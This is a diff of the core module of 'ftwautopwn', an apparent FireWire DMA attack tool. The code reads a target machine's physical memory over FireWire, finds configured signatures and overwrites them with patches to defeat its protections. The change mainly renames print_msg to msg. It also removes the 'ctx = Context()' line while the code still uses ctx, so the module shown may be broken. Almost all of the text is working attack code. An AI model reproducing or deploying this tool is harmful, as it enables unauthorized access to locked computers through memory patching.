@@ -5,15 +5,14 @@ Created on Jun 23, 2011
 '''
 from binascii import hexlify
 from forensic1394 import Bus
-from ftwautopwn.util import print_msg, Context, clean_hex, all_equal
+from ftwautopwn.util import msg, Context, clean_hex, all_equal
 from time import sleep
 
 import sys
 import math
 import collections
-import ftwautopwn.settings as s
-
-ctx = Context()
+import ftwautopwn.settings as settings
+from pprint import pprint
 
 class Method(object):
     '''
@@ -93,7 +92,7 @@ class MemoryFile:
         '''
         For now, dummy method in order to simulate a write
         '''
-        print_msg('!', 'Write to file not supported at the moment.')
+        msg('!', 'Write to file not supported at the moment.')
         pass
         
 
@@ -111,7 +110,7 @@ def run(context):
         ctx.target = select_target(methods, False)
 
     # Print phase, method and patch parameters
-    print_msg('+', 'You have selected: ' + ctx.target.name)
+    msg('+', 'You have selected: ' + ctx.target.name)
     phases = ctx.target.phases
     one_phase = False
     if len(phases) == 1: one_phase = True
@@ -129,7 +128,7 @@ def run(context):
         d = initialize_fw(d)
     
     # Find memory size
-    print_msg('*', 'Detecting memory size...')
+    msg('*', 'Detecting memory size...')
     memsize = findmemsize(d)
     if not memsize:
         fail('Could not determine memory size. Try increasing the delay after enabling SBP2 (-d switch)')
@@ -138,31 +137,31 @@ def run(context):
         print('   {0} MiB main memory detected'.format(int(ctx.memsize/(1024 * 1024))))
     
     # Attack
-    print_msg('+', 'Starting attack...')
+    msg('+', 'Starting attack...')
     for i, phase in enumerate(phases):
         try:
             # Find
-            if not one_phase: print_msg('+', 'Phase ' + str(i + 1) + ':')
+            if not one_phase: msg('+', 'Phase ' + str(i + 1) + ':')
             addr = findsig(d, phase.sig, phase.offset, ctx.memsize)
             if not addr:
-                s._success = False
+                settings.success = False
                 continue
-            print_msg('+', 'Signature found at 0x%x.' % addr)
+            msg('+', 'Signature found at 0x%x.' % addr)
             # Patch and verify if not dry run
             if not ctx.dry_run:
                 d.write(addr, phase.patch)
                 if d.read(addr, len(phase.patch)) == phase.patch:
-                    print_msg('+', 'Write-back verified; patching successful.')
+                    msg('+', 'Write-back verified; patching successful.')
                 else:
-                    print_msg('-', 'Write-back could not be verified; patching unsuccessful.')
+                    msg('-', 'Write-back could not be verified; patching unsuccessful.')
                     #s._success = False
         except IOError:
             print('-', 'I/O Error, make sure FireWire interfaces are properly connected.')
-            s._success = False
+            settings.success = False
         #if not s._success:
         #    break
         
-    if not s._success:
+    if not settings.success:
         fail('Signature not found.')
 
 
@@ -175,16 +174,16 @@ def findmemsize(d):
     for addr in range(fwmax, 0, -step):
         buf = d.read(addr - chunk, chunk)
         if buf:
-            if ctx.verbose: print_msg('*', 'Found memory size:' + str(addr/mb) + ' MB')
+            if ctx.verbose: msg('*', 'Found memory size:' + str(addr/mb) + ' MB')
             return addr
     return None
 
 
 def list_targets(methods):
     print()
-    print_msg('+', 'Available targets:')
+    msg('+', 'Available targets:')
     for i, method in enumerate(methods):
-        print_msg(str(i + 1), method.name)
+        msg(str(i + 1), method.name)
         if ctx.verbose: print('\t' + method.notes)
     print()
 
@@ -206,7 +205,7 @@ def populate_methods(config):
 
         if (len(sigs) != len(patches) or \
             len(patches) != len(pageoffsets)):
-            print_msg('!', 'Uneven number of signatures, phases and page ' 
+            msg('!', 'Uneven number of signatures, phases and page ' 
                       'offsets in section %s of configuration file.' 
                       % method_name)
             sys.exit(1)
@@ -230,11 +229,11 @@ def select_target(methods, selected):
     except:
         if selected == 'q': sys.exit()
         else:
-            print_msg('!', 'Invalid selection, please try again. Type \'q\' to quit.')
+            msg('!', 'Invalid selection, please try again. Type \'q\' to quit.')
             return select_target(methods, False)
     if selected <= nof_targets: return methods[selected - 1]
     else:
-        print_msg('!', 'Please enter a selection between 1 and ' + str(nof_targets) + '. Type \'q\' to quit.')
+        msg('!', 'Please enter a selection between 1 and ' + str(nof_targets) + '. Type \'q\' to quit.')
         return select_target(methods, False)
     
 
@@ -248,7 +247,7 @@ def initialize_fw(d):
             sys.stdout.flush()
             sleep(1)
     except KeyboardInterrupt:
-        print_msg('!', 'Interrupted')
+        msg('!', 'Interrupted')
         pass
     # Open the first device
     d = b.devices()[0]
@@ -299,8 +298,7 @@ def findsig(d, sig, off, memsize):
     return
 
 
-def fail(msg = None):
-    if msg: print_msg('!', msg)
+def fail(string = None):
+    if string: msg('!', string)
     print('[!] Attack unsuccessful.')
     sys.exit(1)
-    
